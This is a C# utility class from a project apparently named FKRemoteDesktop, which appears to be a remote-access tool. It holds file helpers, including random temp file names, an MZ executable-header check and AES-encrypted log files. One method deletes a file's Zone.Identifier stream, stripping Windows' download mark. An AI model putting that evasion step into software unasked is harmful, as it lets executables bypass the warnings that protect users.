using FKRemoteDesktop.Cryptography;
using FKRemoteDesktop.DllHook;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Helpers
{
    public static class FileHelper
    {
        // 有效路径字符
        private static readonly char[] IllegalPathChars = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();
        // 检查一个指定路径是否包含有非法字符
        public static bool HasIllegalCharacters(string path)
        {
            return path.Any(c => IllegalPathChars.Contains(c));
        }

        // 生成一个随机文件名
        public static string GetRandomFilename(int length, string extension = "")
        {
            return string.Concat(StringHelper.GetRandomString(length), extension);
        }

        // 获取一个未使用的临时文件路径
        public static string GetTempFilePath(string extension)
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        // 删除指定文件路径的Windows可执行文件识符（PE格式，如 exe,dll 的头部标识）
        public static bool HasExecutableIdentifier(byte[] binary)
        {
            if (binary.Length < 2) 
                return false;
            return (binary[0] == 'M' && binary[1] == 'Z') || (binary[0] == 'Z' && binary[1] == 'M');
        }

        // 删除指定文件路径的区域标识符（即删除Windows中标记文件来源的信息数据）
        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        // 向一个Log文件添加日志
        public static void WriteLogFile(string filename, string appendText, Aes256 aes)
        {
            appendText = ReadLogFile(filename, aes) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = aes.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }

        // 读取Log文件
        public static string ReadLogFile(string filename, Aes256 aes)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
        }

        // 文件夹拷贝
        public static void CopyDirectory(string sourceDir, string destDir)
        {
            // 创建目标目录
            Directory.CreateDirectory(destDir);

            // 复制所有文件
            foreach (string file in Directory.GetFiles(sourceDir))
            {
                string destFile = Path.Combine(destDir, Path.GetFileName(file));
                File.Copy(file, destFile, true);
            }

            // 递归复制子目录
            foreach (string subDir in Directory.GetDirectories(sourceDir))
            {
                string destSubDir = Path.Combine(destDir, Path.GetFileName(subDir));
                CopyDirectory(subDir, destSubDir);
            }
        }

        // 检查一个文件是否为空
        public static bool IsFileEmpty(string filePath)
        {
            if (!File.Exists(filePath))
                return false; // 文件不存在
            return new FileInfo(filePath).Length == 0;
        }
    }
}
